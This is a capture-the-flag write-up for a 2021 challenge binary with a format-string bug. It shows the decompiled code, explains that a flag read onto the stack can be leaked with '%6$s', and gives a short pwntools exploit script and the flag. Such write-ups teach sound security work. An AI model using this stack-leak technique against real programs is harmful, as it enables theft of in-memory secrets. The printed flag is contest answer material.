# Leaking like a sieve
>This program I developed will greet you, but my friend said it is leaking data like a sieve, what did I forget to add?

> Author: xXl33t_h@x0rXx

> nc pwn-2021.duc.tf 31918

[hellothere](https://drive.google.com/file/d/1gBUUWwU-Z9VRV49flJbHABBEyM-MRM_q/view?usp=sharing)

```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+8h] [rbp-58h]
  char format; // [rsp+10h] [rbp-50h]
  char s; // [rsp+30h] [rbp-30h]
  unsigned __int64 v6; // [rsp+58h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  buffer_init(*(_QWORD *)&argc, argv, envp);
  stream = fopen("./flag.txt", "r");
  if ( !stream )
  {
    puts("The flag file isn't loading. Please contact an organiser if you are running this on the shell server.");
    exit(0);
  }
  fgets(&s, 32, stream);
  while ( 1 )
  {
    puts("What is your name?");
    fgets(&format, 32, stdin);
    printf("\nHello there, ", 32LL);
    printf(&format);
    putchar(10);
  }
}
```

# Solution

The program requires input data, save it at `rbp-0x50` and prints it again with printf 

We can see, that our input is fed directly to the printf() function. What we also should notice, is that the flag is somewhere on the stack also, cause it’s being read into s variable.

The flag is the sixth address stored in the stack so we can print that out by inputting `%6$s`. This format string will interpret the sixth address on the stack as a string and print it out.

```
from pwn import *

if args.REMOTE:
    con = remote('pwn-2021.duc.tf', 31918)
else:
    con = process('./hellothere')

payload  = b''
payload += b'%6$s'

con.sendline(payload)
flag = con.recvuntil(b'}')

print(flag)
```

> Flag: `DUCTF{f0rm4t_5p3c1f13r_m3dsg!}`
